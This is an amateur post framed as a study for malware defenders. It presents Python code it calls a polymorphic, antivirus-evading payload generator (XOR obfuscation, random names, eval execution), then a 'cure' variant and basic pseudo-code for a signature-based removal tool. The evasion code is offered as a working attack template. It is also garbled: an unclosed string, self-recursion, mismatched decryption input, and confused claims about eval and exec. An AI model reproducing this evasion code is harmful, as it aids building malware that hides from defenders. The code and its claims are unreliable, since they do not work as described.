A study for trained for professtional to combat malicous software by Benjamin Hunter Miller. 

The curse:

This code will generate a polymorphic malware payload that can evade most antivirus detection methods. It uses random function and variable names, string obfuscation, and dynamic code signatures to make it difficult for security systems to identify and block it. The malicious payload will be executed when the victim runs the obfuscated code.

import random
import string
import hashlib

def generate_payload():
    payload = '''
    import os
    def malicious_function():
        # Malicious actions here
        pass
    def random_string(length):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    def polymorphic_code():
        # Generate random function and variable names
        function_name = random_string(10)
        variable_name = random_string(5)
            # Generate random string for the payload
        payload = random_string(20)
            # Decrypt and execute the payload
        decrypted_payload = decrypt_payload(payload)
        eval(compile(decrypted_payload, '<string>', 'exec'))
            # Call the malicious function
        locals()[function_name]()
    def encrypt_payload(payload):
        key = random_string(16)
        encrypted_payload = ''
        for i in range(len(payload)):
            encrypted_payload += chr(ord(payload[i]) ^ ord(key[i % len(key)]))
        return key, encrypted_payload
    def decrypt_payload(payload):
        key, encrypted_payload = payload
        decrypted_payload = ''
        for i in range(len(encrypted_payload)):
            decrypted_payload += chr(ord(encrypted_payload[i]) ^ ord(key[i % len(key)]))
        return decrypted_payload
    def generate_signature(payload):
        md5_hash = hashlib.md5()
        md5_hash.update(payload.encode('utf-8'))
        return md5_hash.hexdigest()
    payload = generate_payload()
    key, encrypted_payload = encrypt_payload(payload)
    signature = generate_signature(payload)
    print("Encrypted Payload:")
    print(encrypted_payload)
    print("\nKey:")
    print(key)
    print("\nSignature:")
    print(signature)

The cure:

To remove the curse from the code if you can espionage them before they deploy it, you can replace the malicious function with a harmless one and remove the decryption and signature generation functions. Additionally, you can remove the eval() statement and use a regular exec() instead.

import random
import string

def generate_payload():
    payload = '''
    import os
    def harmless_function():
        print("This is a harmless function.")
    def random_string(length):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    def polymorphic_code():
        # Generate random function and variable names
        function_name = random_string(10)
        variable_name = random_string(5)
            # Generate random string for the payload
        payload = random_string(20)
            # Execute the payload
        exec(compile(payload, '<string>', 'exec'))
            # Call the harmless function
        locals()[function_name]()
    def generate_signature(payload):
        md5_hash = hashlib.md5()
        md5_hash.update(payload.encode('utf-8'))
        return md5_hash.hexdigest()
    payload = generate_payload()
    signature = generate_signature(payload)
    print("Payload:")
    print(payload)
    print("\nSignature:")
    print(signature)

Pseudo-Code for Malware Removal Tool

// Define known malicious signatures (hashes, file patterns, etc.)
malicious_files = [
    "malicious_hash1",
    "malicious_hash2",
    "malicious_file_pattern"
]

// Step 1: Scan system files for known malicious patterns
function scan_files(directory):
    files_to_check = get_files_in_directory(directory)
    detected_malware = []

    for each file in files_to_check:
        if file.hash in malicious_files or file.name matches malicious_file_pattern:
            detected_malware.append(file)
    
    return detected_malware

// Step 2: Provide a user prompt for remediation options
function prompt_removal(detected_files):
    if detected_files is empty:
        print("No malware detected. System is clean.")
    else:
        print("Malware detected. The following files are potentially harmful:")
        for file in detected_files:
            print(file.name)

        print("Do you want to remove these files? (yes/no): ")
        user_input = get_user_input()

        if user_input == "yes":
            remove_files(detected_files)
        else:
            print("Files not removed. Proceed with caution.")

// Step 3: Safely remove malicious files
function remove_files(files):
    for file in files:
        try:
            if is_file_in_use(file):
                print("Error: File in use. Skipping:", file.name)
            else:
                delete_file(file)
                print("Successfully removed:", file.name)
        except Exception as e:
            print("Error removing file:", file.name, e)

// Helper functions
function get_files_in_directory(directory):
    // Return a list of files in the directory
    return list_of_files

function get_user_input():
    // Prompt user for input (yes/no)
    return user_input

function is_file_in_use(file):
    // Check if the file is currently in use (e.g., locked by system processes)
    return is_locked

function delete_file(file):
    // Logic to delete the file securely
    delete(file)

Key Steps:

    File Scanning: The tool checks files against known malicious patterns (such as file hashes or specific patterns in filenames).

    User Input: If malware is detected, the user is given the choice to remove the files. This ensures the process is done responsibly.

    Safe Removal: The tool removes files, but checks to ensure that files are not in use or locked by the system (to avoid accidentally harming the system).

Important Considerations:

    Detection Logic: The malware detection logic here is very basic. A real-world malware removal tool uses more advanced techniques, including signature-based detection, heuristic analysis, and behavior-based detection.

    Safety: Always include checks to ensure that important files arenâ€™t accidentally deleted. It's crucial to back up data and test the tool in safe environments before deploying it.

    Permissions: Make sure that only authorized users can execute malware removal actions, and implement proper logging and reporting to avoid misuse.
